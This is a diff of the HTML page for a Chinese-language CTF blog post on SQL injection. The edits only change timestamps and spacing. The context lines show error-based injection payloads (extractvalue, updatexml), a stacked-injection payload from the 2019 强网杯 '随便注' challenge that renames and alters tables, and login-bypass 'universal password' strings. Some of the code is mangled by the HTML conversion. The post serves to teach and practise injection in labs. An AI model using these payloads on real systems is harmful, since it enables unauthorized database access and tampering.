@@ -48,7 +48,7 @@
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476353408-77d91a36-00ca-415c-9dce-2140ab497eed.png#align=left&display=inline&height=296&name=image.png&originHeight=592&originWidth=623&size=69060&status=done&style=none&width=311.5">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1573476448206-c9771d69-5745-4a2e-9697-dc7a7c661f05.png#align=left&display=inline&height=71&name=image.png&originHeight=142&originWidth=588&size=33010&status=done&style=none&width=294">
 <meta property="article:published_time" content="2019-11-10T05:34:06.000Z">
-<meta property="article:modified_time" content="2020-08-18T00:44:33.958Z">
+<meta property="article:modified_time" content="2020-08-25T06:32:37.658Z">
 <meta property="article:author" content="yichen">
 <meta property="article:tag" content="网络安全 CTF">
 <meta name="twitter:card" content="summary">
@@ -468,7 +468,7 @@
 <td>1</td>
 </tr>
 </tbody></table>
-<p>当扫描第二项 floor(rand(0)<em>2)得到 1，但是 <a href="mailto:1@5.7.19">1@5.7.19</a> 已经存在了，不需要插入，只需要改 count(</em>)</p>
+<p>当扫描第二项 floor(rand(0)<em>2)得到 1，但是<a href="mailto:1@5.7.19">1@5.7.19</a>已经存在了，不需要插入，只需要改 count(</em>)</p>
 <table>
 <thead>
 <tr>
@@ -482,7 +482,7 @@
 </tr>
 </tbody></table>
 <p>扫描第三项时 floor(rand(0)<em>2)得到 0，表中没有，需要插入，但是插入的时候进行了第二次运算，floor(rand(0)</em>2)成了 1</p>
-<p>但是虚拟表中已经有了 <a href="mailto:1@5.7.19">1@5.7.19</a>，x 作为主键，是不允许存在相同的，所以就报错了</p>
+<p>但是虚拟表中已经有了<a href="mailto:1@5.7.19">1@5.7.19</a>，x 作为主键，是不允许存在相同的，所以就报错了</p>
 <h2 id="其他函数介绍"><a href="#其他函数介绍" class="headerlink" title="其他函数介绍"></a>其他函数介绍</h2><p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
 <p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
 <p>上面两个需要传入 xpath 格式的字符串，但是传入的却不符合，但可以执行，所以报错</p>
@@ -571,8 +571,8 @@
 <li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li>
 </ol>
 <h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，会一起执行</p>
-<p>2019 强网杯题目：随便注<br><code>inject=1&#39;; rename table</code>words<code>to</code>words1<code>;rename table</code>1919810931114514<code>to</code>words<code>;alter table</code>words<code>change</code>flag``id<code>varchar(50);#</code></p>
-<p><code>rename table</code>words<code>to</code>words1<code>;</code>    把查询的表明改成 words1<br><code>rename table</code>1919810931114514<code>to</code>words<code>;</code>  把希望查询的表明改成 words<br><code>alter table</code>words<code>change</code>flag``id<code>varchar(50);#</code>    把 id  与 flag  值互换</p>
+<p>2019 强网杯题目：随便注<br><code>inject=1&#39;; rename table</code>words<code>to</code>words1<code>;rename table</code>1919810931114514<code>to</code>words<code>;alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code></p>
+<p><code>rename table</code>words<code>to</code>words1<code>;</code>    把查询的表明改成 words1<br><code>rename table</code>1919810931114514<code>to</code>words<code>;</code>  把希望查询的表明改成 words<br><code>alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code>    把 id  与 flag  值互换</p>
 <h1 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h1><p>常用：</p>
 <p>admin’ #<br>‘+’<br>‘+’<br>0<br>Aaa’=’<br>原理：<br>单引号闭合，井号注释<br><strong>select * from admin where username=’admin’ #</strong>‘ and password =’’</p>
 <p>Mysql 里 select ‘aaaaa’+1  返回的是 1，会把单引号里面的当成 0<br><strong>select * from admin where username=’’+’’ and password =’’+’’</strong><br><em>*select \</em> from admin where username=0 and password =0<br>**都可以爆出数据</p>
@@ -589,7 +589,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-08-18T00:44:33.958Z" itemprop="dateUpdated">2020-08-18 08:44:33</time>
+    最后更新时间：<time datetime="2020-08-25T06:32:37.658Z" itemprop="dateUpdated">2020-08-25 14:32:37</time>
 </span><br>
 
 
